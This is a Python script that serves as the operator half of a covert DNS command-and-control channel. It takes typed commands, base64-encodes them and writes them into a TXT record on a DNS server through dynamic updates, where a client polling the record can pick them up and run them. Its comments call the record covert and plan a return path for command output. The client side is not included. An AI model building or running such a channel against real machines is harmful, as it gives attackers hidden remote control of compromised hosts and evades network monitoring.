import dns.update
import dns.query
import time
import base64

# sleep time in seconds
SLEEP_TIME = 10

# pre-decided zone and record names
ZONE = 'c2.netres.com.'
RECORD = 'message.c2.netres.com.'

# must provide the IP address of the DNS server
DNS_IP = '192.168.243.141'


# update the covert record with the next command we want the client to run
def update_record(new_msg: str) -> str:
    update = dns.update.Update(ZONE)
    update.delete(RECORD, 'TXT')
    update.add(RECORD, 60, 'TXT', new_msg)

    response = dns.query.tcp(update, DNS_IP)
    return response


def main():
    while True:
        command = input('Enter a command: ')
        b64_command = base64.b64encode(command.encode()).decode()
        response = update_record(b64_command)

        if "SERVFAIL" in str(response):
            print('Something went wrong :(')
            continue

        print('Command set. Waiting...')
        time.sleep(SLEEP_TIME)

        # reset the field to be empty
        # in the future, when the client can pass command output back to the server,
        # we can wait to receive that response and then reset the record
        print('Resetting covert text record...\n')
        update_record('""')


if __name__ == '__main__':
    main()

